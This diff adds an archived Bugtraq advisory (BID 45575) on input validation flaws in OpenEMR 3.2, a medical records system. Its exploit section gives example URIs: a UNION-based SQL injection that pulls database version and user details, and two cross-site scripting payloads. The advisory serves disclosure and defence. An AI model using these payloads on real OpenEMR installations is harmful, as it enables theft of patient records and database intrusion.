@@ -1,0 +1,95 @@
+#SpeeDr00t@Black Falcon<br>#bid45575<p><b><span style="font-size: 18pt;">OpenEMR Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/45575/info">info</a><br><a href="http://www.securityfocus.com/bid/45575/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/45575/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/45575/solution">solution</a><br><a href="http://www.securityfocus.com/bid/45575/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				45575
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 27 2010 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Mar 19 2015 08:39AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				wasto
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					OpenEMR OpenEMR 3.2 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues through a browser. To exploit a cross-site-scripting issue, the attacker must entice an unsuspecting user to follow a malicious URI.<br/><br/>The following example URIs are available:<br/><br/>http://example.com/openemr/interface/patient_file/summary/add_edit_issue.php?issue=0+union+select+null,null,null,@@version,system_user(),database(),user(),null,null,null,null,null,null,null,null,null,null,null,null--<br/><br/>http://example.com/openemr/interface/patient_file/summary/immunizations.php?mode=add&amp;amp;id=&amp;amp;pid=98&amp;amp;form_immunization_id=6&amp;amp;administered_date=2010-12-26&amp;amp;manufacturer=&amp;amp;lot_number=&amp;amp;administered_by=Administrator%2C+&amp;amp;administered_by_id=1&amp;amp;education_date=2010-12-26&amp;amp;vis_date=2010-12-26&amp;amp;note=%22%3E%3Cscript%3Ealert%289%29%3C%2Fscript%3E<br/><br/>http://example.com/openemr/controller.php?document&amp;amp;upload&amp;amp;patient_id=2&amp;amp;parent_id=%22%3E%3Cscript%3Ealert%2810%29%3C/script%3E
+	
+		<ul>
+</ul>
+</div>
